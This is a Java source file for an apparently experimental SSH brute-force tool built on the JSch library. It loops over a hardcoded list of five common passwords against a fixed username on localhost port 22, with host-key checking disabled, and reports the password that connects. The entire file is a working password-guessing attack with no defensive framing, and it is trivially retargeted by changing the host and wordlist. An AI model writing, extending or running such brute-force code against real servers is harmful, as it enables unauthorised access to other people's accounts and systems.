package solirs.sshbrutewj;


import com.jcraft.jsch.*;


public class Main
{
    public static void sshbrute() throws JSchException{

        //This is an experimental 
        String passes[] = {"helloworld", "test", "0000", "4444","P4ssw0rd"};

        int i;
        JSch jsch = new JSch();
        jsch.setConfig("StrictHostKeyChecking", "no");

        String user = "username";

        int port = 22;
        



        for (i = 0; i < passes.length ; i++){

            try{


                System.out.println("Trying "+ passes[i]);
                Session session=jsch.getSession(user, "localhost", port);

                session.setTimeout(100);
    
                session.setPassword(passes[i]);
                session.connect();
                System.out.println("CONNECTED " + "Password is " + passes[i]);
                System.exit(0);
                
            }catch(Exception e){
                continue;
            }

        }

        }
    
    public static void sshc() throws JSchException{

        //This function is mainly used for testing single connections

        String user = "username";
        String pass = "Password";
        
    

        JSch jsch = new JSch();
        jsch.setConfig("StrictHostKeyChecking", "no");
        Session session=jsch.getSession(user, "localhost", 22);
        session.setPassword(pass);
        session.connect();
        System.out.println("Connected");

    }
    public static void main( String[] args )
    {
        System.out.println("Starting...");

        try{
            sshbrute();

        } catch(Exception j){
            System.out.print(j);
        }



    }
}
